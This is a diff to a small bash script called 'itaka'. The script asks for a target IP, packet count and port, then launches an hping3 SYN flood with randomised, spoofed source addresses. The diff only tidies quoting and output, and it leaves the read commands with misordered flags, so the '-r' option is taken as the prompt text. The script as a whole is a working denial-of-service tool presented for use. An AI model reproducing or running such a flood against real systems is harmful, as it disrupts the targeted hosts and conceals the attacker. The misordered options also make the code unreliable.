@@ -1,17 +1,16 @@
 #!/bin/bash
 
 RED='\033[31m'
-GREEN='\033[32m'
 BLUE='\033[34m'
 NC='\033[0m'
 
 
-echo "\n"
+printf "\n"
 figlet -f mini "Itaka, Alahmedi 2025, Mohammed Mahmoud 2025"
 echo
 read -p -r -s "[itaka] IP address: " ip
-read -p "[itaka] Amount of packets: " pac
-read -p "[itaka] Port: " port
+read -p -r "[itaka] Amount of packets: " pac
+read -p -r "[itaka] Port: " port
 
 if [[ "$ip" == "" ]]; then
 	echo -e "${RED} [itaka] ERROR: IP not specified, cannot proceed ${NC}"  >&2
@@ -23,9 +22,9 @@ else
 	else
 		if [[ "$port" == "" ]]; then
 			echo -e "${BLUE} [itaka] WARNING: Port not specified, using default ${NC}"
-			sudo hping3 -c $pac -d 64 -S --rand-source $ip
+			sudo hping3 -c "$pac" -d 64 -S --rand-source "$ip"
 		else
-			sudo hping3 -c $pac -d 64 -S -p $port --rand-source $ip
+			sudo hping3 -c "$pac" -d 64 -S -p "$port" --rand-source "$ip"
 		fi
 	fi
 fi
